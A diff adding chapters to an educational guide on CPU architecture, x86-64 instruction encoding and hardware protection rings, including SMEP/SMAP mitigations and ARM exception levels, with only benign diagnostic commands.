@@ -7,25 +7,26 @@
 
 ## Table of Contents
 
-1. [Logic Gates — The Physical Foundation of All Computing](#chapter-01)
+1. [Logic Gates & Von Neumann — The Physical and Architectural Foundation](#chapter-01)
 2. [The Instruction Set — Opcodes, Decoders and the First Programs](#chapter-02)
-3. [History & Philosophy — The ASR-33, Unix, C, BSD and Linux](#chapter-03)
-4. [The Von Neumann Architecture — How the CPU Drives Itself](#chapter-04)
-5. [How Code Works — Machine Code, Assembly, C and Compilers](#chapter-05)
-6. [Storage — Hard Drives, Partitions and Filesystems](#chapter-06)
-7. [The Kernel Interface — Everything is a File, Inodes and System Calls](#chapter-07)
-8. [File Descriptors — The Unified Handle for Everything](#chapter-08)
-9. [The Process Model — Fork, Exec and the Process Tree](#chapter-09)
-10. [The Boot Chain — Power On to Login](#chapter-10)
-11. [Networking — Sockets, TCP and the BSD API](#chapter-11)
-12. [Network Defence — DDoS Protection and the Attack Surface](#chapter-12)
-13. [Service Sandboxing — Isolating Services from the OS](#chapter-13)
-14. [Memory Vulnerabilities — Buffer Overflows and Beyond](#chapter-14)
-15. [Mobile Architecture — From Battery to Baseband](#chapter-15)
+3. [Protection Rings — Hardware-Enforced Privilege](#chapter-03)
+4. [History & Philosophy — The ASR-33, Unix, C, BSD and Linux](#chapter-04)
+5. [Automata Theory, Formal Languages and Regular Expressions](#chapter-05)
+6. [How Code Works — Machine Code, Assembly, C and Compilers](#chapter-06)
+7. [Storage — Hard Drives, Partitions and Filesystems](#chapter-07)
+8. [The Kernel Interface — Everything is a File, Inodes and System Calls](#chapter-08)
+9. [File Descriptors — The Unified Handle for Everything](#chapter-09)
+10. [The Process Model — Fork, Exec and the Process Tree](#chapter-10)
+11. [The Boot Chain — Power On to Login](#chapter-11)
+12. [Networking — Sockets, TCP and the BSD API](#chapter-12)
+13. [Network Defence — DDoS Protection and the Attack Surface](#chapter-13)
+14. [Service Sandboxing — Isolating Services from the OS](#chapter-14)
+15. [Memory Vulnerabilities — Buffer Overflows and Beyond](#chapter-15)
+16. [Mobile Architecture — From Battery to Baseband](#chapter-16)
 
 ---
 
-# Chapter 01: Logic Gates — The Physical Foundation of All Computing
+# Chapter 01: Logic Gates and Von Neumann — The Physical and Architectural Foundation
 
 Before a single line of code, before binary numbers, before any instruction set — there is physics. Every computation that has ever happened on any computer anywhere in the world ultimately reduces to electrons flowing or not flowing through physical material. Understanding this foundation makes everything else in this document not just comprehensible but inevitable. The complexity of a modern operating system is not magic — it is an enormous number of extremely simple physical switches, arranged very cleverly.
 
@@ -678,6 +679,94 @@ None of these solve the bottleneck. They manage it. The bottleneck is intrinsic 
 -e 
 ---
 
+
+---
+
+## The Von Neumann Architecture — How the CPU Drives Itself
+
+Chapter 01 has explained what the CPU is made of — transistors, gates, ALU, registers, control unit. Now the question is: what makes it self-driving? What causes it to keep executing instructions without a human triggering each one?
+
+The answer is the **Von Neumann architecture** — a design principle that emerged in the mid-1940s and defines how every general-purpose computer works to this day.
+
+### The Stored-Program Concept
+
+Before Von Neumann's design (and those of Eckert, Turing and Zuse — covered in Chapter 02), programs were either hardwired into the machine or entered by hand for each run. The revolutionary idea was:
+
+> Store the program instructions in the same memory as the data. Let the CPU fetch them automatically, one after another, forever.
+
+This made the CPU self-driving. Once you place a program in memory and tell the CPU where to start, it runs without any further human intervention.
+
+### The Fetch-Decode-Execute Cycle
+
+The CPU runs one loop continuously from power-on to power-off:
+
+```
+┌─────────────────────────────────────────────────────┐
+│                                                     │
+│   FETCH      Read next instruction from memory      │
+│     ↓        at the address in the Program Counter  │
+│   DECODE     Figure out what that instruction means │
+│     ↓        (the decoder from earlier in this ch.) │
+│   EXECUTE    Carry out the instruction              │
+│     ↓        ALU computes, registers update         │
+│   INCREMENT  Program Counter moves to next address  │
+│     ↓        automatically — no human needed        │
+│     └──────────────── repeat forever ───────────────┘
+│                                                     │
+└─────────────────────────────────────────────────────┘
+```
+
+The **Program Counter** (called Instruction Pointer on x86 — register `RIP`) is the register that holds the address of the next instruction. After each instruction executes, it increments automatically. Jump instructions change it to a different address. That is all branching, looping and function calls are — changing the Program Counter.
+
+Nobody triggers this loop. It runs by itself the moment electricity reaches the CPU because the circuits are wired to behave this way. This is Von Neumann's gift: **the machine drives itself.**
+
+### Memory — Instructions and Data Together
+
+The Von Neumann architecture uses one unified memory for both program instructions and data. This has a profound consequence: a program can read its own instructions as data, and can write new instructions into memory and then execute them.
+
+```
+Memory address space (Von Neumann — unified):
+
+Address 0x00000000: [instruction byte]
+Address 0x00000001: [instruction byte]
+Address 0x00000002: [data byte]          <- same address space
+Address 0x00000003: [instruction byte]
+...
+
+CPU treats address 0x00000002 as data when executing instruction at 0x00000001
+CPU treats address 0x00000002 as instruction if Program Counter points there
+
+Same bytes. Same addresses. Context determines meaning.
+```
+
+This is the foundation of self-modifying code, just-in-time compilation, and — as Chapter 14 will show — shellcode injection. The attacker places bytes in the data area and tricks the CPU into executing them as instructions. Von Neumann's unified memory is what makes this possible.
+
+### The Fixed Starting Address — How the CPU Knows Where to Begin
+
+Every CPU architecture defines a fixed starting address — the address the Program Counter is set to when electricity first hits the chip. The CPU does not decide this. It is hardwired into the silicon.
+
+```
+x86-64: Program Counter starts at physical address 0xFFFFFFF0
+  The BIOS/UEFI ROM chip is mapped to this address by the motherboard
+  CPU immediately begins fetch-decode-execute on BIOS code
+  BIOS runs, finds boot device, loads bootloader
+  Chain continues until your shell appears — Chapter 10
+
+ARM64: Program Counter starts at a reset vector address
+  Configured by the chip manufacturer
+  Boot ROM is mapped there
+  Same principle, different address
+
+RISC-V: starts at address defined by hardware design
+  Often 0x1000 where the boot ROM lives
+  Same principle again
+```
+
+The fixed starting address is why the boot chain in Chapter 10 works automatically. Nobody presses "start." The hardware guarantees code exists at that address, and the CPU's hardwired Program Counter initialisation guarantees execution begins there.
+
+-e 
+---
+
 # Chapter 02: The Instruction Set — Opcodes, Decoders and the First Programs
 
 Chapter 01 established that logic gates respond to bit patterns. This chapter answers what those bit patterns are, how the control unit recognises them, what an opcode is and where the word came from, what the difference is between a CPU's bit width and its opcode width, how the very first programs were written before any tools existed, and how programmers knew what streams of 0s and 1s meant when there was no screen, no ASCII, and no encoding standard.
@@ -1103,6 +1192,367 @@ Example: SUB rd, rs1, rs2
 ```
 
 The RISC-V design philosophy keeps the primary opcode count intentionally small and uses the funct fields for sub-operations. This makes the base decoder extremely simple while still allowing many distinct operations.
+
+---
+
+## x86-64 Encoding — A Complete Explanation
+
+The previous section showed ARM64 and RISC-V are simple to decode because they were designed with clean fixed-length encodings. x86-64 is harder to understand — not because the concept is different but because 45 years of backward-compatible additions created layers that must be understood in historical order to make sense.
+
+### Why x86-64 Is Variable Length — The 1978 Foundation
+
+The Intel 8086 was designed in 1978 when RAM cost thousands of dollars per kilobyte. Every byte of instruction code cost money. The designer made a deliberate choice: **common operations get the shortest possible encodings, rare operations get longer encodings.**
+
+```
+1-byte instructions (most common operations):
+  0x90 = NOP          do nothing
+  0xC3 = RET          return from function
+  0x50 = PUSH RAX     push register onto stack
+  0x40 = INC AX       increment register
+
+2-byte instructions (operations needing a register pair):
+  0x89 0xC3 = MOV BX, AX    copy AX into BX
+  0x01 0xC3 = ADD BX, AX    add AX to BX
+
+3-6 byte instructions (operations needing data values):
+  0xB8 0x05 0x00 0x00 0x00 = MOV EAX, 5
+       ^^^^^^^^^^^^^^^^^^^^
+       the value 5 as 4 bytes
+```
+
+This compression was intentional and logical for 1978. The problem came when more instructions were needed and the encoding had to be extended without breaking existing software.
+
+### How x86 Grew — Seven Layers of Prefixes
+
+Every time Intel or AMD needed to add new capabilities, they added a new prefix byte — a byte that comes before the opcode and modifies its meaning. Each layer is a response to a specific need:
+
+```
+Layer 1 — Original 8086 (1978):
+  Segment override prefixes: 0x26, 0x2E, 0x36, 0x3E
+  Lock prefix: 0xF0 (atomic memory operations)
+  Repeat prefix: 0xF3 (repeat string operations)
+
+  Example: 0xF3 0xA4 = REP MOVSB
+           ^^^^ ^^^^
+           repeat  copy-one-byte opcode
+
+Layer 2 — 80386 extends to 32-bit (1985):
+  Problem: same opcode 0x89 needs to work in 16-bit AND 32-bit mode
+  Solution: operand size prefix 0x66 toggles between widths
+
+  Without 0x66:  0x89 0xC3 = MOV EBX, EAX  (32-bit)
+  With    0x66:  0x66 0x89 0xC3 = MOV BX, AX   (16-bit)
+  Same opcode 0x89. Prefix changes what it means.
+
+  Address size prefix 0x67: switches between 16 and 32-bit addresses.
+
+Layer 3 — 0x0F escape byte (added progressively 1985-2000s):
+  Problem: primary opcode table (256 slots) getting full
+  Solution: reserve 0x0F as escape meaning "next byte is also opcode"
+
+  0x0F opens a second 256-slot table:
+    0x0F 0xAF = IMUL   signed multiply
+    0x0F 0x05 = SYSCALL enter kernel (critical for Chapter 07)
+    0x0F 0xBE = MOVSX  sign-extend byte to register
+    0x0F 0x38 = escape again into a third table
+    0x0F 0x3A = escape into a fourth table
+
+Layer 4 — REX prefix (AMD64, 2003):
+  Problem: 64-bit mode needs 8 new registers and 64-bit operand size
+  Solution: REX prefix byte = 0x40 through 0x4F
+
+  REX byte structure (8 bits):
+    0  1  0  0  W  R  X  B
+    ^^^^^^^^^^^
+    fixed pattern identifying this as REX
+
+    W bit: 0 = 32-bit operands, 1 = 64-bit operands
+    R bit: extends the Reg field in ModRM by 1 bit (accesses R8-R15)
+    X bit: extends the Index field in SIB by 1 bit
+    B bit: extends the RM field in ModRM or opcode register field
+
+  Examples:
+    0x89 0xC3         = MOV EBX, EAX    (32-bit, no REX)
+    0x48 0x89 0xC3    = MOV RBX, RAX    (64-bit, REX.W=1)
+    0x4C 0x89 0xC3    = MOV RBX, R8     (64-bit, REX.R=1 extends reg field)
+    ^^^^
+    0x48 = 0100 1000
+           ^^^^ W=1 R=0 X=0 B=0
+
+Layer 5 — VEX prefix (2011, AVX instructions):
+  Problem: need 256-bit YMM registers, REX cannot encode them cleanly
+  Solution: VEX is 2 or 3 bytes that replace REX + 0x0F escapes
+
+  2-byte VEX: 0xC5 followed by one control byte
+  3-byte VEX: 0xC4 followed by two control bytes
+
+  0xC5 0xFC 0x58 0xC8 = VADDPS YMM1, YMM0, YMM1
+  (add 8 floats simultaneously using 256-bit registers)
+
+Layer 6 — EVEX prefix (2017, AVX-512):
+  Problem: need 512-bit ZMM registers and 32 of them (R0-R31)
+  Solution: EVEX is mandatory 4-byte prefix for all AVX-512 instructions
+
+  0x62 [P1] [P2] [P3] [opcode] [ModRM] ...
+  Encodes: register width, opmask registers, rounding control,
+           zero-masking, broadcast, all 32 ZMM registers
+
+Full instruction with all parts possible:
+  [Legacy prefix 0-4 bytes][REX 0-1 byte][Opcode 1-3 bytes]
+  [ModRM 0-1 byte][SIB 0-1 byte][Displacement 0-4 bytes][Immediate 0-8 bytes]
+  Total: minimum 1 byte, maximum 15 bytes
+```
+
+### The ModRM Byte — Encoding Two Operands in Eight Bits
+
+Most x86-64 instructions that reference memory or use two registers include a **ModRM byte** immediately after the opcode. This single byte encodes three fields:
+
+```
+ModRM byte layout:
+
+  Bit:  7  6   5  4  3   2  1  0
+       ┌────┬────────┬────────┐
+       │ Mod│  Reg   │   RM   │
+       │ 2b │  3b    │  3b    │
+       └────┴────────┴────────┘
+
+Mod field (2 bits) — what RM means:
+  11 = RM is a register directly (register-to-register)
+  00 = RM register is used as a memory address (no displacement)
+  01 = RM register + 8-bit signed displacement added to address
+  10 = RM register + 32-bit signed displacement added to address
+
+Reg field (3 bits) — first operand register:
+  000=RAX  001=RCX  010=RDX  011=RBX
+  100=RSP  101=RBP  110=RSI  111=RDI
+  (REX.R bit adds a 4th bit, allowing R8 through R15)
+
+RM field (3 bits) — second operand register or address base:
+  Same register encoding as Reg field
+  Special cases:
+    RM=100 with Mod≠11: SIB byte follows (complex addressing)
+    RM=101 with Mod=00: RIP-relative addressing (used in PIE binaries)
+```
+
+### Decoding a Real Instruction Byte by Byte
+
+```
+Bytes: 48 89 45 F8
+
+Byte 1: 0x48 = REX prefix
+  Binary: 0100 1000
+          ^^^^ W R X B
+          W=1: use 64-bit registers
+          R=0, X=0, B=0: no register extension needed
+
+Byte 2: 0x89 = opcode
+  Primary table slot 0x89 = "MOV r/m64, r64"
+  Meaning: copy a register (r64) into register or memory (r/m64)
+  The Reg field in ModRM is the SOURCE
+  The RM field in ModRM is the DESTINATION
+
+Byte 3: 0x45 = ModRM byte
+  Binary: 01 000 101
+          ^^ ^^^ ^^^
+          Mod=01: RM register + 8-bit displacement
+          Reg=000: RAX is the source register
+          RM=101:  RBP is the base address register
+
+Byte 4: 0xF8 = displacement
+  Signed 8-bit: 0xF8 = -8
+
+Final decoded instruction:
+  MOV [RBP-8], RAX
+  Store RAX into memory at address (RBP minus 8)
+  This saves a local variable onto the function's stack frame
+  GCC generates this for every local variable in C code
+```
+
+### The SIB Byte — For Array and Complex Addressing
+
+When ModRM's RM field is `100` (binary), a **SIB (Scale-Index-Base) byte** follows. SIB encodes array indexing with scaling:
+
+```
+SIB byte layout:
+
+  Bit:  7  6   5  4  3   2  1  0
+       ┌─────┬────────┬────────┐
+       │Scale│ Index  │  Base  │
+       │ 2b  │  3b    │  3b    │
+       └─────┴────────┴────────┘
+
+Scale: multiply index register by this amount
+  00=x1  01=x2  10=x4  11=x8
+
+Effective address = Base + (Index x Scale) + Displacement
+
+C code:           int x = array[i];
+With int = 4b:    x = *(array_base + i * 4)
+
+Assembly:         MOV EAX, [RBX + RSI*4]
+  RBX = base address of array
+  RSI = index variable i
+  Scale = x4 (each int is 4 bytes)
+
+ModRM: Mod=00, Reg=EAX, RM=100 (SIB follows)
+SIB:   Scale=10(x4), Index=RSI, Base=RBX
+
+Entire array access encoded in: opcode(1) + ModRM(1) + SIB(1) = 3 bytes
+```
+
+### A Complete C Function Decoded
+
+```c
+int add(int a, int b) {
+    return a + b;
+}
+```
+
+GCC produces (unoptimised, x86-64 Linux calling convention):
+
+```
+Offset  Hex bytes      Assembly              Explanation
+------  -----------    --------------------  ----------------------------------
++0000   55             PUSH RBP              save caller's frame pointer
++0001   48 89 E5       MOV RBP, RSP          set up this function's frame
++0004   89 7D FC       MOV [RBP-4], EDI      save argument a (EDI) to stack
++0007   89 75 F8       MOV [RBP-8], ESI      save argument b (ESI) to stack
++000A   8B 45 FC       MOV EAX, [RBP-4]      load a from stack into EAX
++000D   03 45 F8       ADD EAX, [RBP-8]      add b from stack to EAX
++0010   5D             POP RBP               restore caller's frame pointer
++0011   C3             RET                   return (result is in EAX)
+
+Decoding key instructions:
+
+55 = PUSH RBP
+  1-byte instruction. Low 3 bits of 0x50-0x57 encode register.
+  0x55 = 0x50 + 5 = RBP. No ModRM needed.
+
+48 89 E5 = MOV RBP, RSP
+  0x48 = REX (W=1 for 64-bit)
+  0x89 = MOV r/m64, r64
+  0xE5 = ModRM: Mod=11(register), Reg=100(RSP source), RM=101(RBP dest)
+
+89 7D FC = MOV [RBP-4], EDI
+  0x89 = MOV r/m32, r32 (no REX = 32-bit operands)
+  0x7D = ModRM: Mod=01(+disp8), Reg=111(EDI source), RM=101(RBP base)
+  0xFC = displacement: -4 signed
+
+03 45 F8 = ADD EAX, [RBP-8]
+  0x03 = ADD r32, r/m32
+  0x45 = ModRM: Mod=01(+disp8), Reg=000(EAX dest), RM=101(RBP base)
+  0xF8 = displacement: -8 signed
+
+C3 = RET
+  1-byte instruction. Always pops return address from stack and jumps there.
+  This is opcode 0xC3 — the byte that every ROP gadget ends with.
+```
+
+### How the x86-64 CPU Handles Variable Length
+
+ARM64's decoder receives 32 bits and knows immediately it is one complete instruction. x86-64's decoder receives a byte stream and must determine instruction boundaries before it can decode anything.
+
+Modern Intel and AMD CPUs use a two-stage approach:
+
+```
+Stage 1 — Pre-decoder (runs ahead of main decoder):
+
+Receives raw byte stream from instruction cache.
+Determines instruction boundaries by scanning for:
+  - Is this byte a legacy prefix? Mark it, advance.
+  - Is this byte REX (0x40-0x4F)? Mark it, advance.
+  - Is this byte 0x0F? Two-byte opcode, read one more.
+    Is next byte 0x38 or 0x3A? Three-byte opcode, read one more.
+  - Now we have the opcode. Look up in pre-decoder table:
+    Does this opcode require ModRM? Read it.
+    Does ModRM indicate SIB (RM=100, Mod!=11)? Read it.
+    Does Mod indicate displacement? Read 1 or 4 bytes.
+    Does opcode require immediate? Read 1,2,4, or 8 bytes.
+  - Mark the end of this instruction.
+  - Next byte is start of next instruction.
+
+Output: stream of instruction packets with boundaries marked.
+
+Stage 2 — Main decoder:
+
+Receives pre-identified instruction packets.
+Decodes each into internal micro-operations (uops).
+Sends uops to execution units.
+Execution units never see x86-64 bytes — only uops.
+
+This is why modern Intel CPUs can decode 4-6 instructions per cycle
+despite variable-length encoding — the pre-decoder pipeline
+runs well ahead and absorbs the complexity.
+```
+
+### Side by Side — The Same ADD in All Three Architectures
+
+```
+Operation: add two 64-bit registers, store result in first
+
+x86-64 (Intel/AMD):
+  Bytes:   48 01 F8
+  Length:  3 bytes
+  Decoded: REX.W=1, opcode 0x01 (ADD r/m64,r64),
+           ModRM 0xF8 (Mod=11, Reg=RDI, RM=RAX)
+  Meaning: ADD RAX, RDI
+
+ARM64 (Apple Silicon, phones, Pi):
+  Bytes:   00 00 01 8B
+  Length:  4 bytes (always)
+  Binary:  1000 1011 0000 0001 0000 0000 0000 0000
+  Fields:  op=ADD, Rd=X0, Rn=X0, Rm=X1
+  Meaning: ADD X0, X0, X1
+
+RISC-V RV64 (open architecture):
+  Bytes:   33 04 B5 00
+  Length:  4 bytes (always)
+  Binary:  0000 0000 1011 0101 0000 0100 0011 0011
+  Fields:  opcode=ADD, rd=x8, rs1=x10, rs2=x11
+  Meaning: ADD x8, x10, x11
+
+Key differences:
+  x86-64: 3 bytes, complex multi-field decode, REX for 64-bit
+  ARM64:  4 bytes, fixed layout, fields at fixed bit positions always
+  RISC-V: 4 bytes, fixed layout, opcode always bits 6-0
+```
+
+### Why This Complexity Is Not Going Away
+
+x86-64's encoding complexity exists for one reason only: backward compatibility. Every instruction that ran on an 8086 in 1978 still runs on a 2024 Intel Core i9 with identical bytes. The encoding could never be simplified without breaking that promise.
+
+```
+Alternative that Intel could have taken (but did not):
+
+"Starting with the next CPU, all programs must be recompiled.
+We are using a clean fixed-length encoding like ARM."
+
+Consequences:
+  - Every operating system must be recompiled
+  - Every application must be recompiled
+  - Every library must be recompiled
+  - Any program without source code is permanently lost
+  - The transition period requires running two instruction sets
+  - Customers must replace all software
+
+Intel looked at this cost and chose to extend the existing encoding
+instead. They made this choice repeatedly, every few years,
+from 1982 to 2017.
+
+AMD looked at Intel's choice in 2003 when designing AMD64 and
+made the same decision — extend x86 rather than start clean.
+
+ARM in 1985 had no installed base to protect.
+They designed for simplicity.
+
+RISC-V in 2010 had no installed base to protect.
+They designed for simplicity.
+
+x86-64 is the price of 45 years of unbroken backward compatibility.
+It is a reasonable price. Every program ever compiled for x86 still works.
+But the encoding complexity is real and permanent.
+```
+
 
 ---
 
@@ -1765,7 +2215,481 @@ The instruction set is the hardware contract that defines every trust boundary a
 -e 
 ---
 
-# Chapter 03: History & Philosophy — The ASR-33, Unix, C, BSD and Linux
+-e 
+---
+
+# Chapter 03: Protection Rings — Hardware-Enforced Privilege
+
+Chapters 01 and 02 explained the hardware and instruction set. Every program runs on the same CPU, using the same instructions. But not every program should be allowed to do everything. A user's web browser should not be able to read another user's files, disable interrupts, or modify the CPU's page tables. This chapter explains the hardware mechanism that enforces these boundaries — protection rings.
+
+---
+
+## The Problem — Everything Running at the Same Level
+
+The earliest computers of the 1940s and 1950s had no privilege separation. Every program had complete access to everything: any memory address, any hardware register, any CPU instruction. On a time-sharing system where many users ran programs simultaneously, one user's bug or malicious code could corrupt the operating system itself, crash the machine, or read another user's private data.
+
+Software boundaries alone cannot solve this. A program with full CPU access can overwrite any software check. The boundary must be enforced by the CPU itself — in hardware — at a level the program cannot reach or bypass.
+
+---
+
+## Where Rings Came From — Multics, 1964
+
+The concept of hardware protection rings was designed for the **Multics** operating system at MIT in 1964, built in collaboration with General Electric and Bell Labs. The designers needed a way to enforce trust levels between different parts of the system. They invented the ring model and worked with GE hardware engineers to implement it in the **GE-645** processor — the first CPU with hardware ring support.
+
+```
+Multics ring model (1964):
+  Ring 0: kernel            (most trusted, most privileged)
+  Ring 1: memory management
+  Ring 2: operating system services
+  Ring 3: user programs     (least trusted, least privileged)
+  Ring 4-7: further layers
+
+The further from ring 0, the less privilege.
+Moving inward toward 0 requires explicit permission.
+Moving outward is automatic.
+```
+
+Multics actually used all eight rings. When Ken Thompson and Dennis Ritchie created Unix in 1969 as a deliberate simplification of Multics, they kept only two effective levels: kernel mode and user mode. This two-level model became the standard.
+
+---
+
+## How Rings Work in Hardware
+
+The CPU contains a small field in a control register that indicates the current privilege level. On x86 this is called **CPL — Current Privilege Level**, stored in the bottom two bits of the CS (code segment) register.
+
+```
+CPL field — 2 bits — four possible values:
+
+  00 = Ring 0  (kernel — most privileged)
+  01 = Ring 1  (unused in practice on modern systems)
+  10 = Ring 2  (unused in practice on modern systems)
+  11 = Ring 3  (user programs — least privileged)
+```
+
+The CPU's decoder — the same decoder from Chapter 02 — checks the CPL field on every instruction that touches a privileged resource. If CPL is 3 and the instruction requires CPL 0, the CPU raises a **General Protection Fault** immediately, before the instruction executes.
+
+```
+Hardware privilege check on every privileged instruction:
+
+Instruction fetched and decoded
+         |
+         v
+Does this instruction require ring 0?
+
+  YES: check CPL field
+         CPL == 0: execute normally
+         CPL == 3: raise General Protection Fault
+                   CPU stops this instruction
+                   CPU switches to ring 0
+                   Kernel fault handler runs
+                   Kernel sends SIGSEGV to the process
+                   Process is terminated
+
+  NO: execute regardless of CPL
+      (normal arithmetic, memory within mapped pages —
+       these require no privilege check)
+```
+
+This is not software checking. The check is wired into the control unit. A ring 3 program cannot disable it, cannot patch it, cannot bypass it. The hardware enforces it unconditionally.
+
+---
+
+## What Each Ring Can and Cannot Do
+
+```
+Ring 0 — Kernel Mode:
+  Execute any CPU instruction without restriction
+  Read and write any memory address
+  Configure the CPU (page tables, interrupt handlers, control registers)
+  Access hardware ports and registers directly
+  Enable and disable interrupts globally
+  Switch between processes (context switching)
+  Map and unmap memory pages
+  Modify privilege levels
+
+Ring 3 — User Mode:
+  Execute non-privileged instructions (arithmetic, logic, branches)
+  Read and write its own mapped memory pages
+  Make system calls (the controlled gate into ring 0)
+  Use floating point and vector units
+  CANNOT execute privileged instructions (instant fault)
+  CANNOT access memory outside its mapped pages (page fault)
+  CANNOT directly talk to hardware
+  CANNOT modify page tables
+  CANNOT disable interrupts
+  CANNOT access other processes' memory
+```
+
+---
+
+## The System Call Gate — The Only Legal Way Into Ring 0
+
+A user program in ring 3 constantly needs the kernel to do things for it — open files, send network packets, create processes. But the program cannot jump arbitrarily into ring 0 code. The kernel must control exactly where ring 3 can enter.
+
+The solution is a **controlled gate** — a specific CPU instruction that atomically switches privilege level and jumps to a kernel-defined entry point simultaneously. The program has no choice about where it enters.
+
+On x86-64 this gate is the `SYSCALL` instruction (opcode `0x0F 0x05` from Chapter 02):
+
+```
+SYSCALL instruction execution — what happens in hardware:
+
+Ring 3 program executes: SYSCALL
+
+1. CPU reads the LSTAR register
+   (kernel stored the syscall entry address here during boot)
+
+2. CPU atomically performs all of these simultaneously:
+   a. CPL changes from 3 to 0    <- privilege switches to kernel
+   b. Stack pointer loads kernel stack
+   c. Instruction Pointer jumps to LSTAR address
+
+3. CPU is now in ring 0 executing kernel code
+   Kernel reads syscall number from RAX
+   Validates all arguments
+   Performs the requested operation
+   Puts result in RAX
+
+4. Kernel executes SYSRET instruction
+   CPU atomically:
+   a. CPL changes from 0 back to 3
+   b. Instruction Pointer returns to ring 3 code
+   c. Stack pointer restores ring 3 stack
+
+5. Ring 3 program resumes with result in RAX
+
+The ring 3 program had no control over WHERE in the kernel it entered.
+The CPU forced the jump to the kernel's chosen entry point.
+This prevents jumping into the middle of privileged code arbitrarily.
+```
+
+Every line in `strace` output — every system call — is one complete ring 3 → ring 0 → ring 3 transition. The transition takes roughly 100-300 nanoseconds on modern hardware.
+
+```bash
+# Every line is a ring transition
+strace ls 2>&1 | head -20
+
+# Count total ring transitions a program makes
+strace -c ls
+
+# Watch ring transitions in real time on any process
+strace -p $(pgrep nginx | head -1)
+```
+
+---
+
+## Memory Protection — Rings and Page Tables Together
+
+The ring level alone does not prevent one user program from reading another user program's memory. Both run at ring 3. Additional isolation comes from the **page table system** working alongside rings.
+
+Each page table entry has a **User/Supervisor bit** (U/S bit):
+
+```
+Page table entry (simplified):
+
+  [Physical address] [...flags...] [U/S] [R/W] [Present]
+                                    ^^^
+                                    0 = supervisor only (ring 0)
+                                    1 = user accessible (ring 0 and 3)
+
+When CPU accesses a memory address:
+  1. Walk page table to find physical address
+  2. Check U/S bit against current CPL:
+     U/S=0 and CPL=3: page fault -> SIGSEGV
+     U/S=1 and CPL=3: allowed
+     CPL=0: always allowed regardless of U/S
+
+Kernel memory pages: U/S=0
+  Ring 3 cannot read kernel memory even if it knows the address
+  Hardware raises page fault before the read completes
+
+Process A's pages: U/S=1 but only in process A's page table
+  Process B has a completely different page table
+  Process B's page table does not map process A's physical pages
+  Process B cannot reach process A's memory at all
+```
+
+This two-layer protection means:
+- Ring level prevents privileged instructions (CPU instruction check)
+- U/S bit prevents kernel memory access (page table check)
+- Separate page tables prevent cross-process memory access (virtual memory isolation)
+
+---
+
+## SMEP and SMAP — Modern Ring Extensions
+
+Modern x86-64 CPUs added two hardware features that close common exploitation techniques that abused the ring boundary:
+
+### SMEP — Supervisor Mode Execution Prevention (Intel 2011)
+
+When the CPU is in ring 0 (kernel mode), SMEP prevents it from executing instructions from pages marked as user pages (U/S=1).
+
+```
+Without SMEP (exploitable):
+  Attacker places shellcode in user memory (ring 3 page)
+  Attacker tricks kernel into jumping to that address
+  Kernel (ring 0) executes shellcode from user memory
+  Attacker has kernel privilege
+
+With SMEP:
+  Kernel (ring 0) attempts to execute from user page (U/S=1)
+  CPU raises fault immediately — before execution
+  Attack fails at hardware level
+```
+
+### SMAP — Supervisor Mode Access Prevention (Intel 2012)
+
+When in ring 0, SMAP prevents the kernel from accidentally reading or writing user pages unless it explicitly allows it with a special instruction.
+
+```
+Without SMAP (exploitable):
+  Attacker places fake kernel data structures in user memory
+  Attacker tricks kernel into using a pointer into user memory
+  Kernel reads attacker-controlled data and uses it for decisions
+  Privilege escalation or memory corruption
+
+With SMAP:
+  Kernel reads a user-space pointer
+  CPU raises fault — cannot access user memory from ring 0
+  Kernel must explicitly use STAC instruction to allow user access
+  Then immediately CLAC to re-enable SMAP
+  Accidental use of user pointers is detected in hardware
+```
+
+```bash
+# Verify your CPU has these features
+grep -m1 "flags" /proc/cpuinfo | tr ' ' '\n' | grep -E "smep|smap"
+
+# See SMAP in use — kernel uses STAC/CLAC around user memory access
+sudo objdump -d /boot/vmlinuz-$(uname -r) 2>/dev/null | grep -E "stac|clac" | head -5
+```
+
+---
+
+## Rings 1 and 2 — Why They Went Unused
+
+Intel implemented all four rings in hardware expecting operating systems to use them all — device drivers in ring 1, OS services in ring 2, applications in ring 3. Unix never used them. The reasons:
+
+**Performance** — crossing ring boundaries requires CPU work. Using rings 1 and 2 for device drivers means every driver call crosses two boundaries instead of one. The overhead was not worth the isolation benefit on 1970s hardware.
+
+**Portability** — Unix was designed to run on many CPU architectures, many of which had no ring concept. Depending on rings 1 and 2 would bind Unix to specific hardware.
+
+**Simplicity** — the two-level model (kernel trusted, user untrusted, system calls as the gate) was clean, understandable and sufficient.
+
+Windows NT made the same choice. Every major modern operating system uses only rings 0 and 3.
+
+---
+
+## Where Rings 1 and 2 Actually Got Used — Virtualisation
+
+The unused rings 1 and 2 found an unexpected use in the early 2000s for **virtual machines**. VMware needed to run a guest operating system (which expected to be in ring 0) on hardware where the host OS already occupied ring 0.
+
+The solution: run the guest kernel in ring 1 instead. When the guest kernel executed privileged instructions (which it expected to work), they faulted because ring 1 cannot execute them. The VMware hypervisor in ring 0 caught each fault, emulated the operation, and returned control to the guest. The guest kernel never knew it was not really in ring 0.
+
+```
+Early VMware ring usage (before hardware virtualisation):
+
+Ring 0: VMware hypervisor (real hardware control)
+Ring 1: Guest OS kernel (thinks it is ring 0)
+Ring 2: (sometimes guest drivers)
+Ring 3: Guest user applications
+
+This was called "ring compression" — complex and had overhead.
+```
+
+In 2005-2006, Intel (VT-x) and AMD (AMD-V) added proper hardware virtualisation with a new mode called **VMX root mode** — a privilege level more powerful than ring 0, where the hypervisor runs. Guest operating systems now get their own complete ring 0 in a separate execution context. Ring 1 and ring 2 became irrelevant for virtualisation.
+
+---
+
+## ARM Exception Levels — The Mobile Ring Equivalent
+
+ARM does not use the term "ring." It uses **Exception Levels** (EL), but the concept is identical — a hardware-enforced privilege field in the CPU state that controls what instructions are allowed.
+
+```
+ARM Exception Levels:
+
+EL0: Unprivileged (equivalent to x86 ring 3)
+  User applications run here
+  Cannot execute privileged instructions
+  Must use SVC instruction to enter EL1 (like SYSCALL)
+
+EL1: Privileged (equivalent to x86 ring 0)
+  Operating system kernel runs here
+  Full access to CPU configuration
+  Manages page tables, interrupts, processes
+
+EL2: Hypervisor (no x86 equivalent in mainstream use)
+  Hypervisor (KVM on Android, Hyper-V on Windows ARM)
+  Controls virtualisation
+  EL1 and EL0 run inside a virtual machine it manages
+
+EL3: Secure Monitor (no x86 equivalent)
+  Most privileged mode
+  Controls transitions between Normal World and Secure World
+  Cannot be reached from any normal exception path
+```
+
+ARM EL0 = x86 Ring 3. ARM EL1 = x86 Ring 0. ARM adds EL2 (hypervisor) and EL3 (secure monitor) that go deeper than anything x86 exposes to mainstream software.
+
+---
+
+## TrustZone — A Second Dimension of Privilege
+
